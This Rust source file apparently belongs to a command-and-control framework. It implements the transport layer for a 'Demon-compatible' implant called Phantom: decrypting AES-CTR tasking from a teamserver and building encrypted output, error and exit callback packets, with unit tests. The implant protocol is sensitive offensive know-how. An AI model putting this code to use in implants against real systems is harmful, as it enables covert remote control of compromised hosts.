//! Demon-compatible transport helpers for Phantom.

use std::path::Path;

pub use red_cell_common::agent_protocol::{
    AgentMetadata, build_callback_packet, build_init_packet, parse_init_ack,
    serialize_init_metadata,
};
use red_cell_common::crypto::{
    AgentCryptoMaterial, ctr_blocks_for_len, decrypt_agent_data_at_offset,
};
use red_cell_common::demon::{
    DemonCallback, DemonCommand, DemonEnvelope, DemonMessage, DemonPackage,
};

use crate::error::PhantomError;

/// Decrypted task stream plus the next shared CTR offset.
#[derive(Debug, Clone)]
pub struct TaskingResponse {
    /// Parsed task packages.
    pub packages: Vec<DemonPackage>,
    /// Shared CTR offset after consuming the response body.
    pub next_ctr_offset: u64,
}

/// Parse and decrypt a `CommandGetJob` response.
///
/// The teamserver returns a raw [`DemonMessage`] byte stream where each
/// package's payload is individually encrypted at successive monotonic CTR
/// offsets.  This differs from [`parse_tasking_response`], which decrypts
/// the entire message body as a single blob inside a [`DemonEnvelope`].
///
/// Returns the decrypted packages and the updated CTR offset after consuming
/// all per-package ciphertexts.
pub fn parse_job_response(
    crypto: &AgentCryptoMaterial,
    ctr_offset: u64,
    response_body: &[u8],
) -> Result<(Vec<DemonPackage>, u64), PhantomError> {
    if response_body.is_empty() {
        return Ok((Vec::new(), ctr_offset));
    }

    let message = DemonMessage::from_bytes(response_body)?;
    let mut packages = Vec::with_capacity(message.packages.len());
    let mut offset = ctr_offset;

    for mut package in message.packages {
        if !package.payload.is_empty() {
            let ciphertext_len = package.payload.len();
            package.payload =
                decrypt_agent_data_at_offset(&crypto.key, &crypto.iv, offset, &package.payload)?;
            offset += ctr_blocks_for_len(ciphertext_len);
        }
        packages.push(package);
    }

    Ok((packages, offset))
}

/// Decrypt a tasking response body into packages.
pub fn parse_tasking_response(
    agent_id: u32,
    crypto: &AgentCryptoMaterial,
    ctr_offset: u64,
    response_body: &[u8],
) -> Result<TaskingResponse, PhantomError> {
    if response_body.is_empty() {
        return Ok(TaskingResponse { packages: Vec::new(), next_ctr_offset: ctr_offset });
    }

    let encrypted_payload = match DemonEnvelope::from_bytes(response_body) {
        Ok(envelope) => {
            if envelope.header.agent_id != agent_id {
                return Err(PhantomError::InvalidResponse("task envelope agent_id mismatch"));
            }
            envelope.payload
        }
        Err(_) => response_body.to_vec(),
    };

    let decrypted =
        decrypt_agent_data_at_offset(&crypto.key, &crypto.iv, ctr_offset, &encrypted_payload)?;
    let message = DemonMessage::from_bytes(&decrypted)?;

    Ok(TaskingResponse {
        packages: message.packages,
        next_ctr_offset: ctr_offset + ctr_blocks_for_len(encrypted_payload.len()),
    })
}

/// Build a generic output callback packet.
#[allow(dead_code)]
pub fn build_output_packet(
    agent_id: u32,
    crypto: &AgentCryptoMaterial,
    ctr_offset: u64,
    seq_num: u64,
    request_id: u32,
    text: &str,
) -> Result<Vec<u8>, PhantomError> {
    let payload = length_prefixed_bytes(text.as_bytes())?;
    Ok(build_callback_packet(
        agent_id,
        crypto,
        ctr_offset,
        seq_num,
        u32::from(DemonCommand::CommandOutput),
        request_id,
        &payload,
    )?)
}

/// Build a generic error callback packet.
#[allow(dead_code)]
pub fn build_error_packet(
    agent_id: u32,
    crypto: &AgentCryptoMaterial,
    ctr_offset: u64,
    seq_num: u64,
    request_id: u32,
    text: &str,
) -> Result<Vec<u8>, PhantomError> {
    let mut payload = Vec::new();
    payload.extend_from_slice(&u32::from(DemonCallback::ErrorMessage).to_be_bytes());
    payload.extend_from_slice(&length_prefixed_bytes(text.as_bytes())?);
    Ok(build_callback_packet(
        agent_id,
        crypto,
        ctr_offset,
        seq_num,
        u32::from(DemonCommand::CommandError),
        request_id,
        &payload,
    )?)
}

/// Build an exit callback packet.
#[allow(dead_code)]
pub fn build_exit_packet(
    agent_id: u32,
    crypto: &AgentCryptoMaterial,
    ctr_offset: u64,
    seq_num: u64,
    request_id: u32,
    exit_method: u32,
) -> Result<Vec<u8>, PhantomError> {
    Ok(build_callback_packet(
        agent_id,
        crypto,
        ctr_offset,
        seq_num,
        u32::from(DemonCommand::CommandExit),
        request_id,
        &exit_method.to_be_bytes(),
    )?)
}

/// Return the number of CTR blocks consumed by a callback payload body.
///
/// The encrypted region is `seq_num(8 LE) | payload_len(4) | payload`;
/// `command_id` and `request_id` are transmitted in the clear.
#[must_use]
pub fn callback_ctr_blocks(callback_payload_len: usize) -> u64 {
    ctr_blocks_for_len(8 + 4 + callback_payload_len)
}

fn length_prefixed_bytes(bytes: &[u8]) -> Result<Vec<u8>, PhantomError> {
    let len = u32::try_from(bytes.len())
        .map_err(|_| PhantomError::InvalidResponse("length-prefixed field too large"))?;
    let mut out = Vec::with_capacity(4 + bytes.len());
    out.extend_from_slice(&len.to_be_bytes());
    out.extend_from_slice(bytes);
    Ok(out)
}

/// Best-effort executable name for process listings.
#[must_use]
pub fn executable_name(path: &Path) -> String {
    path.file_name()
        .and_then(|value| value.to_str())
        .map_or_else(|| path.display().to_string(), String::from)
}

#[cfg(test)]
mod tests {
    use std::path::Path;

    use red_cell_common::agent_protocol::INIT_EXT_MONOTONIC_CTR;
    use red_cell_common::agent_protocol::INIT_EXT_SEQ_PROTECTED;
    use red_cell_common::crypto::{
        ctr_blocks_for_len, decrypt_agent_data, decrypt_agent_data_at_offset, encrypt_agent_data,
        generate_agent_crypto_material,
    };
    use red_cell_common::demon::{DEMON_MAGIC_VALUE, DemonCallback, DemonCommand};

    use super::{
        AgentMetadata, build_error_packet, build_exit_packet, build_init_packet,
        build_output_packet, callback_ctr_blocks, executable_name, parse_init_ack,
        parse_tasking_response,
    };

    fn metadata() -> AgentMetadata {
        AgentMetadata {
            hostname: String::from("linux-host"),
            username: String::from("operator"),
            domain_name: String::from("WORKGROUP"),
            internal_ip: String::from("127.0.0.1"),
            process_path: String::from("/usr/bin/phantom"),
            process_pid: 123,
            process_tid: 0,
            process_ppid: 1,
            process_arch: 2,
            elevated: false,
            base_address: 0,
            os_major: 6,
            os_minor: 8,
            os_product_type: 1,
            os_service_pack: 0,
            os_build: 0,
            os_arch: 9,
            sleep_delay: 5_000,
            sleep_jitter: 0,
            kill_date: 0,
            working_hours: 0,
        }
    }

    #[test]
    fn init_packet_uses_demon_header() {
        let crypto = generate_agent_crypto_material().expect("crypto");
        let packet = build_init_packet(0x4142_4344, &crypto, &metadata(), None).expect("packet");
        assert_eq!(&packet[4..8], &DEMON_MAGIC_VALUE.to_be_bytes());
        assert_eq!(&packet[8..12], &0x4142_4344_u32.to_be_bytes());
    }

    #[test]
    fn init_packet_contains_monotonic_ctr_and_seq_protected_flags() {
        let crypto = generate_agent_crypto_material().expect("crypto");
        let agent_id = 0x4142_4344_u32;
        let packet = build_init_packet(agent_id, &crypto, &metadata(), None).expect("packet");
        let envelope = red_cell_common::demon::DemonEnvelope::from_bytes(&packet).expect("env");

        // Skip: command_id(4) + padding(4) + key(32) + iv(16) = 56 bytes of cleartext header.
        let encrypted = &envelope.payload[56..];
        let plaintext = decrypt_agent_data(&crypto.key, &crypto.iv, encrypted).expect("decrypt");

        // The last 4 bytes of the decrypted init metadata must be the extension flags.
        let tail = &plaintext[plaintext.len() - 4..];
        let ext_flags = u32::from_be_bytes(tail.try_into().expect("4 bytes"));
        assert_ne!(
            ext_flags & INIT_EXT_MONOTONIC_CTR,
            0,
            "init packet must include INIT_EXT_MONOTONIC_CTR extension flag"
        );
        assert_ne!(
            ext_flags & INIT_EXT_SEQ_PROTECTED,
            0,
            "init packet must include INIT_EXT_SEQ_PROTECTED extension flag"
        );
    }

    #[test]
    fn init_packet_versioned_inserts_secret_version_before_ciphertext() {
        let crypto = generate_agent_crypto_material().expect("crypto");
        let agent_id = 0x1122_3344_u32;
        let version = 7_u8;
        let packet =
            build_init_packet(agent_id, &crypto, &metadata(), Some(version)).expect("packet");
        let envelope = red_cell_common::demon::DemonEnvelope::from_bytes(&packet).expect("env");
        // command_id(4) + request_id(4) + key(32) + iv(16) = 56; then version byte.
        assert!(
            envelope.payload.len() > 57,
            "versioned init payload must extend past version byte"
        );
        assert_eq!(envelope.payload[56], version);
        let encrypted = &envelope.payload[57..];
        let plaintext = decrypt_agent_data(&crypto.key, &crypto.iv, encrypted).expect("decrypt");
        assert!(plaintext.len() >= 4, "decrypted metadata should include agent_id prefix");
    }

    #[test]
    fn output_packet_encrypts_payload() {
        let crypto = generate_agent_crypto_material().expect("crypto");
        let seq_num = 1_u64;
        let packet = build_output_packet(7, &crypto, 0, seq_num, 99, "hello").expect("packet");
        let envelope = red_cell_common::demon::DemonEnvelope::from_bytes(&packet).expect("env");

        // command_id and request_id are in the clear.
        assert_eq!(&envelope.payload[..4], &u32::from(DemonCommand::CommandOutput).to_be_bytes());
        assert_eq!(&envelope.payload[4..8], &99_u32.to_be_bytes());

        // Remainder is encrypted: seq_num(8 LE) + payload_len(4) + payload.
        let plaintext =
            decrypt_agent_data(&crypto.key, &crypto.iv, &envelope.payload[8..]).expect("decrypt");
        let decoded_seq = u64::from_le_bytes(plaintext[..8].try_into().expect("seq"));
        assert_eq!(decoded_seq, seq_num);
        let payload_len = u32::from_be_bytes(plaintext[8..12].try_into().expect("len")) as usize;
        assert_eq!(payload_len, 4 + "hello".len()); // length-prefixed bytes
    }

    #[test]
    fn parse_job_response_returns_empty_for_empty_body() {
        let crypto = generate_agent_crypto_material().expect("crypto");
        let (packages, offset) = super::parse_job_response(&crypto, 7, &[]).expect("parse");
        assert!(packages.is_empty());
        assert_eq!(offset, 7, "CTR offset must not advance on empty body");
    }

    #[test]
    fn parse_job_response_decrypts_per_package_payloads() {
        let crypto = generate_agent_crypto_material().expect("crypto");
        let start_offset: u64 = 5;

        let plain1 = vec![0xAA, 0xBB, 0xCC, 0xDD];
        let plain2 = vec![0x11, 0x22];

        let enc1 = red_cell_common::crypto::encrypt_agent_data_at_offset(
            &crypto.key,
            &crypto.iv,
            start_offset,
            &plain1,
        )
        .expect("enc1");
        let enc2 = red_cell_common::crypto::encrypt_agent_data_at_offset(
            &crypto.key,
            &crypto.iv,
            start_offset + ctr_blocks_for_len(enc1.len()),
            &plain2,
        )
        .expect("enc2");

        let packages = vec![
            red_cell_common::demon::DemonPackage {
                command_id: 0x0001,
                request_id: 10,
                payload: enc1.clone(),
            },
            red_cell_common::demon::DemonPackage {
                command_id: 0x0002,
                request_id: 20,
                payload: enc2.clone(),
            },
        ];
        let message =
            red_cell_common::demon::DemonMessage::new(packages).to_bytes().expect("serialize");

        let (decrypted, next_offset) =
            super::parse_job_response(&crypto, start_offset, &message).expect("parse");
        assert_eq!(decrypted.len(), 2);
        assert_eq!(decrypted[0].command_id, 0x0001);
        assert_eq!(decrypted[0].request_id, 10);
        assert_eq!(decrypted[0].payload, plain1);
        assert_eq!(decrypted[1].command_id, 0x0002);
        assert_eq!(decrypted[1].request_id, 20);
        assert_eq!(decrypted[1].payload, plain2);
        assert_eq!(
            next_offset,
            start_offset + ctr_blocks_for_len(enc1.len()) + ctr_blocks_for_len(enc2.len())
        );
    }

    #[test]
    fn parse_job_response_passes_through_empty_package_payloads() {
        let crypto = generate_agent_crypto_material().expect("crypto");
        let packages = vec![red_cell_common::demon::DemonPackage::new(
            DemonCommand::CommandNoJob,
            1,
            Vec::new(),
        )];
        let message =
            red_cell_common::demon::DemonMessage::new(packages).to_bytes().expect("serialize");

        let (decrypted, offset) = super::parse_job_response(&crypto, 3, &message).expect("parse");
        assert_eq!(decrypted.len(), 1);
        assert!(decrypted[0].payload.is_empty());
        assert_eq!(offset, 3, "empty payload must not advance CTR");
    }

    #[test]
    fn tasking_response_accepts_raw_encrypted_message() {
        let crypto = generate_agent_crypto_material().expect("crypto");
        let package =
            red_cell_common::demon::DemonPackage::new(DemonCommand::CommandNoJob, 1, Vec::new());
        let message = red_cell_common::demon::DemonMessage::new(vec![package]);
        let plaintext = message.to_bytes().expect("message");
        let encrypted = red_cell_common::crypto::encrypt_agent_data_at_offset(
            &crypto.key,
            &crypto.iv,
            0,
            &plaintext,
        )
        .expect("encrypt");

        let response = parse_tasking_response(11, &crypto, 0, &encrypted).expect("response");
        assert_eq!(response.packages.len(), 1);
        assert_eq!(response.next_ctr_offset, callback_ctr_blocks(0));
    }

    #[test]
    fn parse_init_ack_returns_consumed_ctr_blocks() {
        let crypto = generate_agent_crypto_material().expect("crypto");
        let agent_id = 0x1337_4242_u32;
        let ack = encrypt_agent_data(&crypto.key, &crypto.iv, &agent_id.to_le_bytes())
            .expect("encrypted ack");

        let ctr = parse_init_ack(&ack, agent_id, &crypto).expect("parse ack");

        assert_eq!(ctr, 1);
    }

    #[test]
    fn parse_init_ack_rejects_agent_id_mismatch() {
        let crypto = generate_agent_crypto_material().expect("crypto");
        let ack = encrypt_agent_data(&crypto.key, &crypto.iv, &0x1337_4242_u32.to_le_bytes())
            .expect("encrypted ack");

        let error = parse_init_ack(&ack, 0x4242_1337, &crypto).expect_err("mismatch");
        assert!(matches!(
            error,
            red_cell_common::agent_protocol::AgentProtocolError::InvalidResponse(
                "init acknowledgement agent_id mismatch"
            )
        ));
    }

    #[test]
    fn error_packet_encodes_callback_discriminator_and_message() {
        let crypto = generate_agent_crypto_material().expect("crypto");
        let seq_num = 1_u64;
        let packet = build_error_packet(7, &crypto, 0, seq_num, 99, "boom").expect("packet");
        let envelope = red_cell_common::demon::DemonEnvelope::from_bytes(&packet).expect("env");

        // command_id and request_id are in the clear.
        assert_eq!(&envelope.payload[..4], &u32::from(DemonCommand::CommandError).to_be_bytes());
        assert_eq!(&envelope.payload[4..8], &99_u32.to_be_bytes());

        // Remainder is encrypted: seq_num(8 LE) + payload_len(4) + callback_type(4) + len_prefixed("boom").
        let plaintext =
            decrypt_agent_data_at_offset(&crypto.key, &crypto.iv, 0, &envelope.payload[8..])
                .expect("decrypt");
        let decoded_seq = u64::from_le_bytes(plaintext[..8].try_into().expect("seq"));
        assert_eq!(decoded_seq, seq_num);
        assert_eq!(&plaintext[8..12], &12_u32.to_be_bytes());
        assert_eq!(&plaintext[12..16], &u32::from(DemonCallback::ErrorMessage).to_be_bytes());
        assert_eq!(&plaintext[16..20], &4_u32.to_be_bytes());
        assert_eq!(&plaintext[20..24], b"boom");
    }

    #[test]
    fn exit_packet_encodes_exit_method() {
        let crypto = generate_agent_crypto_material().expect("crypto");
        let seq_num = 1_u64;
        let packet = build_exit_packet(7, &crypto, 0, seq_num, 99, 3).expect("packet");
        let envelope = red_cell_common::demon::DemonEnvelope::from_bytes(&packet).expect("env");

        // command_id and request_id are in the clear.
        assert_eq!(&envelope.payload[..4], &u32::from(DemonCommand::CommandExit).to_be_bytes());
        assert_eq!(&envelope.payload[4..8], &99_u32.to_be_bytes());

        // Remainder is encrypted: seq_num(8 LE) + payload_len(4) + exit_method(4).
        let plaintext =
            decrypt_agent_data_at_offset(&crypto.key, &crypto.iv, 0, &envelope.payload[8..])
                .expect("decrypt");
        let decoded_seq = u64::from_le_bytes(plaintext[..8].try_into().expect("seq"));
        assert_eq!(decoded_seq, seq_num);
        assert_eq!(&plaintext[8..12], &4_u32.to_be_bytes());
        assert_eq!(&plaintext[12..16], &3_u32.to_be_bytes());
    }

    #[test]
    fn executable_name_uses_leaf_name_when_available() {
        assert_eq!(executable_name(Path::new("/usr/bin/bash")), "bash");
    }
}
